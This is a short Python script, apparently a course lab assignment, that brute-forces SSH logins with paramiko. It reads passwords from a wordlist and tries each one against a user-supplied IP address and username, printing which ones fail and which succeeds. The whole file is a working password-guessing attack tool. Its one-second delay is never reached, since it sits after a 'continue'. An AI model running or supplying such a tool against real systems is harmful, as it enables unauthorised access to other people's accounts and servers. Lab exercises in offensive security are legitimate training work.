#!/usr/bin/env python3

# Script Name:                  Brute Force Attack Tool
# Author:                       Raphael Chookagian
# Date of latest revision:      08/09/2023
# Purpose:                      Create a python script:
# Attack Windows Server VM on private subnet of Midterm VPC



import paramiko
import time

def SSHBrute(file_path, ip_address, username):
    with open(file_path, 'r') as file:
        for line in file:
            password = line.strip()  # remove newline characters
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip_address, username=username, password=password)
                print(f"Successful login with: {password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"Failed login with: {password}")
                continue
            time.sleep(1)
    print("No successful login found.")

def main():
    file_path = input("Enter (wordlist) file path: ")
    username = input("Enter username: ")
    ip_address = input("Enter target IP: ")
    SSHBrute(file_path, ip_address, username)

if __name__ == "__main__":
    main()
